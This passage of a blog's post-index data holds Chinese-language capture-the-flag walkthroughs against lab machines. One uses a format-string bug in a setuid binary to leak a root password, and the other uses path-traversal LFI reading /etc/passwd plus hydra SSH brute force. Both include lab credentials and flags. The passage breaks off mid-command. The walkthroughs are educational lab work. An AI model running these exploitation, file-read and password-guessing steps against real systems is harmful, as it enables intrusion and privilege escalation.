70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f34bfaf5d7a.0x7ffd3af090b8.0x13af09289.\n\n```\n\n\u968f\u4fbf\u62ff\u4e00\u884c\u5904\u7406\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ echo '0x7ffd3af08f60.0x7f34bfca0be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f' | sed 's/0x//g; s/\\./\\n/g'|while read line; do echo '$line' | xxd -r -p 2>/dev/null |rev 2>/dev/null;done\n%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.welcome:Y0u_c4nt_f1nd_m3                                                                                     \n```\n\nwelcome:Y0u_c4nt_f1nd_m3\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ssh welcome@192.168.205.139\nThe authenticity of host '192.168.205.139 (192.168.205.139)' can't be established.\nED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:5: [hashed name]\n    ~/.ssh/known_hosts:9: [hashed name]\n    ~/.ssh/known_hosts:10: [hashed name]\n    ~/.ssh/known_hosts:11: [hashed name]\n    ~/.ssh/known_hosts:12: [hashed name]\n    ~/.ssh/known_hosts:13: [hashed name]\n    ~/.ssh/known_hosts:14: [hashed name]\n    ~/.ssh/known_hosts:15: [hashed name]\n    (6 additional names omitted)\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.205.139' (ED25519) to the list of known hosts.\nwelcome@192.168.205.139's password: \nLinux easyfmt 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Wed Jun 18 09:56:53 2025 from 192.168.43.21\nwelcome@easyfmt:~$ id\nuid=1000(welcome) gid=1000(welcome) groups=1000(welcome)\n```\n\n\u627e\n\n```\nwelcome@easyfmt:~$ ls -al\ntotal 44\ndrwx------ 3 welcome welcome 4096 Jun 17 10:53 .\ndrwxr-xr-x 3 root    root    4096 Apr 11 22:27 ..\nlrwxrwxrwx 1 root    root       9 Jun 15 08:24 .bash_history -> /dev/null\n-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout\n-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc\ndrwxr-xr-x 4 welcome welcome 4096 Jun 17 00:58 .cache\n-rw------- 1 root    root       2 Jun 15 08:59 .gdb_history\n-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile\n-rw-r--r-- 1 welcome welcome  682 Jun 17 07:39 server.c\n-rw-r--r-- 1 root    root      44 Jun 17 10:40 user.txt\n-rw------- 1 welcome welcome 8187 Jun 17 10:53 .viminfo\nwelcome@easyfmt:~$ cat user.txt \nflag{user-a0f6b8f4de02df56f52e55bcdded458c}\nwelcome@easyfmt:~$ sudo -l\nsudo: unable to resolve host easyfmt: Name or service not known\n[sudo] password for welcome: \nSorry, user welcome may not run sudo on easyfmt.\nwelcome@easyfmt:~$ find / -perm -4000 -type f 2>/dev/null\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/umount\n/usr/bin/pkexec\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/libexec/polkit-agent-helper-1\n/opt/vuln\nwelcome@easyfmt:~$ cd /opt/\nwelcome@easyfmt:/opt$ ls -al\ntotal 52\ndrwxr-xr-x  3 root    root     4096 Jun 18 09:51 .\ndrwxr-xr-x 18 root    root     4096 Mar 18 20:37 ..\ndrwxr-xr-x  6 root    root     4096 Dec 31  1969 pwndbg\n-rwxr-xr-x  1 welcome welcome 16696 Jun 17 07:39 server\n-rwsr-xr-x  1 root    root    17104 Jun 18 09:51 vuln\nwelcome@easyfmt:/opt$ strings vuln \n/lib64/ld-linux-x86-64.so.2\nmgUa\nsetuid\nexit\nperror\nputs\nstdin\nprintf\nfgets\nread\nmalloc\nopen\n__cxa_finalize\nsetgid\n__libc_start_main\nlibc.so.6\nGLIBC_2.2.5\n_ITM_deregisterTMCloneTable\n__gmon_start__\n_ITM_registerTMCloneTable\nu/UH\n[]A\\A]A^A_\n/root/pass.txt\nopen\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\n;*3$'\nGCC: (Debian 10.2.1-6) 10.2.1 20210110\ncrtstuff.c\nderegister_tm_clones\n__do_global_dtors_aux\ncompleted.0\n__do_global_dtors_aux_fini_array_entry\nframe_dummy\n__frame_dummy_init_array_entry\nvuln.c\n__FRAME_END__\n__init_array_end\n_DYNAMIC\n__init_array_start\n__GNU_EH_FRAME_HDR\n_GLOBAL_OFFSET_TABLE_\n__libc_csu_fini\n_ITM_deregisterTMCloneTable\nputs@GLIBC_2.2.5\nstdin@GLIBC_2.2.5\n_edata\nprintf@GLIBC_2.2.5\nread@GLIBC_2.2.5\n__libc_start_main@GLIBC_2.2.5\nfgets@GLIBC_2.2.5\n__data_start\n__gmon_start__\n__dso_handle\n_IO_stdin_used\n__libc_csu_init\nmalloc@GLIBC_2.2.5\n__bss_start\nmain\nsetgid@GLIBC_2.2.5\nopen@GLIBC_2.2.5\nperror@GLIBC_2.2.5\nexit@GLIBC_2.2.5\n__TMC_END__\n_ITM_registerTMCloneTable\nsetuid@GLIBC_2.2.5\n__cxa_finalize@GLIBC_2.2.5\n.symtab\n.strtab\n.shstrtab\n.interp\n.note.gnu.build-id\n.note.ABI-tag\n.gnu.hash\n.dynsym\n.dynstr\n.gnu.version\n.gnu.version_r\n.rela.dyn\n.rela.plt\n.init\n.plt.got\n.text\n.fini\n.rodata\n.eh_frame_hdr\n.eh_frame\n.init_array\n.fini_array\n.dynamic\n.got.plt\n.data\n.bss\n.comment\n```\n\n\u62c9\u8fc7\u6765\uff0c\u4e22\u53bbida\n\n```\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\nchar s[68]; // [rsp+10h] [rbp-50h] BYREF\nint fd; // [rsp+54h] [rbp-Ch]\nvoid *buf; // [rsp+58h] [rbp-8h]\nsetuid(0);\nsetgid(0);\nbuf = malloc(0x18uLL);\nfd = open('/root/pass.txt', 0);\nif ( fd < 0 )\n{\nperror('open');\nexit(1);\n}\nputs('welcome:I have found mine.Then,where is your password?');\nputs('root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.');\nputs('welcome:Hahahaha,let's try:');\nread(fd, buf, 0x18uLL);\nfgets(s, 6, stdin);\nprintf(s);\nreturn 0;\n}\n```\n\n\u4ed6\u76f4\u63a5\u628a\u8f93\u5165\u7684\u5b57\u7b26\u4e32s\u5f53\u4f5cprintf\u7684\u53c2\u6570\u4e86\n\n\u6240\u4ee5\u7ee7\u7eed\n\n```\nwelcome@easyfmt:/opt$ for i in $(seq 1 20);do\n> p='/opt/vuln'\n> pa='%$i\\$s'\n> echo ''$pa''\n> echo '$pa' | $p\n> done\n'%1$s'\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\nSegmentation fault\n'%2$s'\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\n(null)\n'%3$s'\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\n\n'%4$s'\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\n%4$s\n\n'%5$s'\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\n\ufffdf!\ufffd[U\n'%6$s'\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\n,\ufffd^@\ufffd\n'%7$s'\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\nSegmentation fault\n'%8$s'\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\nSegmentation fault\n'%9$s'\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\nSegmentation fault\n'%10$s'\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\n'%11$s'\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\nH\ufffd\ufffdH9\ufffdu\ufffdH\ufffd[]A\\A]A^A_\ufffd'%12$s'\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\n(null)'%13$s'\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\n(null)'%14$s'\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\nAWL\ufffd=?+'%15$s'\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\n1\ufffdI\ufffd\ufffd^H\ufffd\ufffdH\ufffd\ufffd\ufffdPTL\ufffd\n'%16$s'\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\nSegmentation fault\n'%17$s'\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\nY0u_4r3_S0_Gr34t!\n'%18$s'\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\nAWL\ufffd=?+'%19$s'\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\n\ufffd\ufffd\ufffdy'%20$s'\nwelcome:I have found mine.Then,where is your password?\nroot:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.\nwelcome:Hahahaha,let's try:\n```\n\nY0u_4r3_S0_Gr34t!\n\n```\nwelcome@easyfmt:/opt$ su -\nPassword: \nroot@easyfmt:~# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@easyfmt:~# cat /root/root.txt \nflag{root-8a6fbe864f3154b901643b4943980d5e}\n```\n\nsentence", "top": 0, "createdAt": 1751016572, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P34": {"htmlDir": "docs/post/nei-bu-_Eva.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Eva", "postUrl": "post/nei-bu-_Eva.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/34", "commentNum": 0, "wordCount": 28670, "description": "![image-20250608102554020](https://7r1umphk.github.io/image/20250608102601444.webp)\n\n\u6253\u5764\u6253\u5764\n\n\u63a2\u6d4bip\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ sudo arp-scan -l                                      \n[sudo] password for kali: \nInterface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.\n192.168.205.130 08:00:27:9c:35:56       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:ed:18:9e       VMware, Inc.\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.044 seconds (125.24 hosts/sec). 4 responded\n                       \n```\n\n\u9776\u673aip 192.168.205.130\uff0c\u63a2\u6d4b\u670d\u52a1\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ nmap -p- 192.168.205.130            \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 22:27 EDT\nNmap scan report for 192.168.205.130\nHost is up (0.00022s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:9C:35:56 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.21 seconds\n                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ nmap -p22,80 -sC -sV 192.168.205.130\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 22:28 EDT\nNmap scan report for 192.168.205.130\nHost is up (0.00034s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey: \n|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\n|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\n|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: \\xE2\\x9D\\x80 \\xE9\\xBE\\x8D \\xC2\\xB7 \\xE8\\xA6\\xBA\\xE9\\x86\\x92 \\xE2\\x9D\\x80\nMAC Address: 08:00:27:9C:35:56 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 7.13 seconds\n\n```\n\n\u5e38\u89c4\uff0c\u770bweb\n\n![1](https://7r1umphk.github.io/image/20250608102947610.webp)\n\n\u4e00\u4e2a\u5173\u4e8e\u300a\u9f99\u65cf\u300b\u7684\u9875\u9762\n\u6252\u62c9\u4e86\u4e00\u4e0b\u6e90\u4ee3\u7801\uff0c\u6ca1\u6709\u4ec0\u4e48\n\n\u76ee\u5f55\u7206\u7834\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ dirsearch -u http://192.168.205.130/                                \n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460\n\nOutput File: /mnt/hgfs/gx/reports/http_192.168.205.130/__25-06-07_22-30-53.txt\n\nTarget: http://192.168.205.130/\n\n[22:30:53] Starting: \n[22:30:54] 403 -  280B  - /.ht_wsr.txt\n[22:30:54] 403 -  280B  - /.htaccess.bak1\n[22:30:54] 403 -  280B  - /.htaccess.orig\n[22:30:54] 403 -  280B  - /.htaccess.sample\n[22:30:54] 403 -  280B  - /.htaccess.save\n[22:30:54] 403 -  280B  - /.htaccess_extra\n[22:30:54] 403 -  280B  - /.htaccess_sc\n[22:30:54] 403 -  280B  - /.htaccess_orig\n[22:30:54] 403 -  280B  - /.htaccessBAK\n[22:30:54] 403 -  280B  - /.htaccessOLD\n[22:30:54] 403 -  280B  - /.htaccessOLD2\n[22:30:54] 403 -  280B  - /.htm\n[22:30:54] 403 -  280B  - /.html\n[22:30:54] 403 -  280B  - /.htpasswd_test\n[22:30:54] 403 -  280B  - /.htpasswds\n[22:30:54] 403 -  280B  - /.httr-oauth\n[22:30:54] 403 -  280B  - /.php\n[22:31:14] 403 -  280B  - /server-status\n[22:31:14] 403 -  280B  - /server-status/\n\nTask Completed\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ gobuster dir -u http://192.168.205.130/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.130/\n[+] Method:                  GET\n[+] Threads:                 64\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.php                 (Status: 403) [Size: 280]\n/.html                (Status: 403) [Size: 280]\n/index.html           (Status: 200) [Size: 12224]\n/dragon.php           (Status: 200) [Size: 10284]\nProgress: 76819 / 1102800 (6.97%)\n```\n\n\u63a2\u6d4b\u5230\u4e00\u4e2a/dragon.php\uff0c\u5148\u770b\u770b\n![image-20250608103236313](https://7r1umphk.github.io/image/20250608103236778.webp)\n\n\u6709\u56db\u4e2a\u8a00\u7075\uff0c\u6252\u62c9\u4e00\u4e0b\u6e90\u4ee3\u7801\n\u6e90\u4ee3\u7801\u91cd\u70b9\n\n```\n<div class='incantation-name' data-name='divinedecree'>\n                DivineDecree\n                <div class='tooltip'>\n                    <div class='tooltip-title'>DIVINE DECREE</div>\n                    <div class='tooltip-desc'>\n                        The holy light that illuminates all truth. This ability allows access to all knowledge and secrets.<br><br>\n                        \u26a0\ufe0f WARNING: DivineDecree can reveal and read ALL content without restrictions. Handle with extreme care!\n                    </div>\n                </div>\n            </div>\n```\n\n'\u26a0\ufe0f \u8b66\u544a\uff1aDivineDecree \u53ef\u4ee5\u4e0d\u53d7\u9650\u5236\u5730\u663e\u793a\u548c\u9605\u8bfb\u6240\u6709\u5185\u5bb9\u3002\u8bf7\u683c\u5916\u5c0f\u5fc3\uff01'\n\n\u63d0\u793a\u6211\u4eec\u662f\u4e00\u4e2aLFI\uff0c\u7136\u540e\u5b83\u6309\u94ae\u786e\u5b9e\u662f\u53d1\u5305\u4e86\n\n```\n<form method='post'>\n            <input \n                type='text' \n                name='incantation' \n                id='incantation-input'\n                class='incantation-input' \n                placeholder='Enter Incantation...' \n                autocomplete='off'\n            >\n```\n\n\u6240\u4ee5\u5927\u6982\u62fc\u63a5\u4e00\u4e0bincantation=DivineDecree\n\nburp\u6293\u4e00\u4e0b\n\n```\nPOST /dragon.php HTTP/1.1\nHost: 192.168.205.130\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 24\nOrigin: http://192.168.205.130\nConnection: keep-alive\nReferer: http://192.168.205.130/dragon.php\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\n\nincantation=divinedecree\n```\n\n\u53d1\u5305\u6ca1\u6709\u4efb\u4f55\u53d8\u5316\uff0c\u4f46\u662f\u5b83\u90fd\u63d0\u9192\u662fLFI\u4e86\u6240\u4ee5FUZZ\u4e00\u4e0b\n\n\u4e24\u4e2a\u65b9\u6848\n\n\u4f60\u53ef\u4ee5\u62ffburp intruder fuzz\n\n\u6216\u8005\u62ffwfuzz fuzz\uff0c\u6211\u6f14\u793awfuzz\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://192.168.205.130/dragon.php?FUZZ=../../../etc/passwd' -X POST -d 'incantation=divinedecree' --hh 10213\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.205.130/dragon.php?FUZZ=../../../etc/passwd\nTotal requests: 220559\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                                           \n=====================================================================\n\n000000759:   200        347 L    917 W      11711 Ch    'file'                                                                                                            \n^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...\n\nTotal time: 0\nProcessed Requests: 1097\nFiltered Requests: 1096\nRequests/sec.: 0\n```\n\ncurl\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ wget http://192.168.205.130/dragon.php                                                                              \n--2025-06-07 22:42:08--  http://192.168.205.130/dragon.php\nConnecting to 192.168.205.130:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: unspecified [text/html]\nSaving to: \u2018dragon.php\u2019\n\ndragon.php                                       [ <=>                                                                                          ]  10.04K  --.-KB/s    in 0s      \n\n2025-06-07 22:42:08 (370 MB/s) - \u2018dragon.php\u2019 saved [10284]\n\n                     \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl http://192.168.205.130/dragon.php?file=../../../etc/passwd -X POST -d 'incantation=divinedecree' -o 1.php                \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 11893    0 11869  100    24  2658k   5504 --:--:-- --:--:-- --:--:-- 2903k\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ diff dragon.php 1.php                                               \n229c229,258\n<                 \n---\n>         root:x:0:0:root:/root:/bin/bash\n> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n> bin:x:2:2:bin:/bin:/usr/sbin/nologin\n> sys:x:3:3:sys:/dev:/usr/sbin/nologin\n> sync:x:4:65534:sync:/bin:/bin/sync\n> games:x:5:60:games:/usr/games:/usr/sbin/nologin\n> man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n> lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n> mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n> news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n> uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n> proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n> www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n> backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n> list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n> irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n> gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n> _apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n> systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n> systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n> systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n> systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n> messagebus:x:104:110::/nonexistent:/usr/sbin/nologin\n> sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n> Fingal:x:1000:1000::/home/Fingal:/bin/sh\n> lumingfei:x:1001:1001::/home/lumingfei:/usr/sbin/nologin\n> uesugierii:x:1002:1002:,,,:/home/uesugierii:/bin/bash\n>         \n>                     <div class='effect divinedecree-effect' style='z-index: 5;'></div>\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ diff dragon.php 1.php |grep 'bash'\n>         root:x:0:0:root:/root:/bin/bash\n> uesugierii:x:1002:1002:,,,:/home/uesugierii:/bin/bash\n              \n```\n\n\u62ff\u5230\u4e00\u4e2auesugierii\u7528\u6237\uff0c\u770b\u6709\u6ca1\u6709ssh\u79c1\u94a5\n\n\u6ca1\u6709\uff0c\u62ff\u53bbhydra\u5427\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ hydra -l uesugierii -P 5000q.txt ssh://192.168.205.130 -I -u -f -e nsr -t 64                            \nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-07 22:45:30\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 64 tasks per 1 server, overall 64 tasks, 5003 login tries (l:1/p:5003), ~79 tries per task\n[DATA] attacking ssh://192.168.205.130:22/\n[22][ssh] host: 192.168.205.130   login: uesugierii   password: sakura\n[STATUS] attack finished for 192.168.205.130 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-07 22:45:36\n                            \n```\n\nuesugierii:sakura\uff0cssh\u767b\u5f55\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ssh uesugierii@192.168.205.130\nThe authenticity of host '192.168.205.130 (192.168.205.130)' can't be established.\nED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:5: [hashed name]\n    ~/.ssh/known_hosts:9: [hashed name]\n    ~/.ssh/known_hosts:10: [hashed name]\n    ~/.ssh/known_hosts:11: [hashed name]\n    ~/.ssh/known_hosts:12: [hashed name]\n    ~/.ssh/known_hosts:13: [hashed name]\n    ~/.ssh/known_hosts:14: [hashed name]\n    ~/.ssh/known_hosts:15: [hashed name]\n    (1 additional names omitted)\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.205.130' (ED25519) to the list of known hosts.\nuesugierii@192.168.205.130's password: \nLinux EVA 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nuesugierii@EVA:~$ id\nuid=1002(uesugierii) gid=1002(uesugierii) groups=1002(uesugierii)\n```\n\n\u6252\u62c9\u4fe1\u606f\n\n```\nuesugierii@EVA:~$ sudo -l\n\nWe trust you have received the usual lecture from the local System\nAdministrator. It usually boils down to these three things:\n\n    #1) Respect the privacy of others.\n    #2) Think before you type.\n    #3) With great power comes great responsibility.\n\n[sudo] password for uesugierii: \nSorry, user uesugierii may not run sudo on EVA.\nuesugierii@EVA:~$ ls -la\ntotal 24\ndrwx------ 2 uesugierii uesugierii 4096 Jun  6 09:48 .\ndrwxr-xr-x 5 root       root       4096 Jun  6 09:43 ..\n-rw-r--r-- 1 uesugierii uesugierii  220 Jun  6 09:43 .bash_logout\n-rw-r--r-- 1 uesugierii uesugierii 3526 Jun  6 09:43 .bashrc\n-rw------- 1 uesugierii uesugierii  840 Jun  6 09:48 eva.pinglog\n-rw-r--r-- 1 uesugierii uesugierii  807 Jun  6 09:43 .profile\nuesugierii@EVA:~$ cat 